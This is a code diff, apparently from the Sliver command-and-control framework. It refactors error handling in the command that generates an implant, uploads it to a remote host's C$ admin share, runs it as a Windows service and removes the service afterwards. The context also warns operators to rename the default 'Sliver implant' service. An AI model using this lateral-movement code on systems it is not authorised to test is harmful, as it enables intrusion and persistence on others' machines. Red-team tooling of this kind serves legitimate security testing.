@@ -62,8 +62,8 @@ func (s *Service) Execute(args []string) (err error) {
 	uploadPath := fmt.Sprintf(`\\%s\%s`, hostname, strings.ReplaceAll(strings.ToLower(binPath), "c:", "C$"))
 
 	if serviceName == "Sliver" || serviceDesc == "Sliver implant" {
-		log.Errorf("Warning: you're going to deploy the following service:\n- Name: %s\n- Description: %s\n", serviceName, serviceDesc)
-		log.Errorf("You might want to change that before going further...\n")
+		log.Warnf("Warning: you're going to deploy the following service:\n- Name: %s\n- Description: %s\n", serviceName, serviceDesc)
+		log.Warnf("You might want to change that before going further...\n")
 		if !core.IsUserAnAdult() {
 			return
 		}
@@ -74,8 +74,7 @@ func (s *Service) Execute(args []string) (err error) {
 	go log.SpinUntil(fmt.Sprintf("Generating sliver binary for %s\n", profile), generateCtrl)
 	profiles, err := transport.RPC.ImplantProfiles(context.Background(), &commonpb.Empty{})
 	if err != nil {
-		log.Errorf("Error: %v\n", err)
-		return
+		return log.Errorf("Error: %v", err)
 	}
 	generateCtrl <- true
 	<-generateCtrl
@@ -86,8 +85,7 @@ func (s *Service) Execute(args []string) (err error) {
 		}
 	}
 	if p.GetName() == "" {
-		log.Errorf("no profile found for name %s\n", profile)
-		return
+		return log.Errorf("no profile found for name %s", profile)
 	}
 	sliverBinary, err := getSliverBinary(*p, transport.RPC)
 	filename := randomString(10)
@@ -105,8 +103,7 @@ func (s *Service) Execute(args []string) (err error) {
 	uploadCtrl <- true
 	<-uploadCtrl
 	if err != nil {
-		log.Errorf("Error: %s\n", err)
-		return
+		return log.Errorf("Error: %s", err)
 	}
 	log.Infof("Uploaded service binary to %s\n", upload.GetPath())
 	log.Infof("Waiting a bit for the file to be analyzed ...\n")
@@ -131,12 +128,10 @@ func (s *Service) Execute(args []string) (err error) {
 	serviceCtrl <- true
 	<-serviceCtrl
 	if err != nil {
-		log.Errorf("Error: %v\n", err)
-		return
+		return log.Errorf("Error: %v", err)
 	}
 	if start.Response != nil && start.Response.Err != "" {
-		log.Errorf("Error: %s\n", start.Response.Err)
-		return
+		return log.Errorf("Error: %s", start.Response.Err)
 	}
 	log.Infof("Successfully started service on %s (%s)\n", hostname, binaryPath)
 	removeChan := make(chan bool)
@@ -151,12 +146,10 @@ func (s *Service) Execute(args []string) (err error) {
 	removeChan <- true
 	<-removeChan
 	if err != nil {
-		log.Errorf("Error: %v\n", err)
-		return
+		return log.Errorf("Error: %v", err)
 	}
 	if removed.Response != nil && removed.Response.Err != "" {
-		log.Errorf("Error: %s\n", removed.Response.Err)
-		return
+		return log.Errorf("Error: %s", removed.Response.Err)
 	}
 	log.Infof("Successfully removed service %s on %s\n", serviceName, hostname)
 	return nil
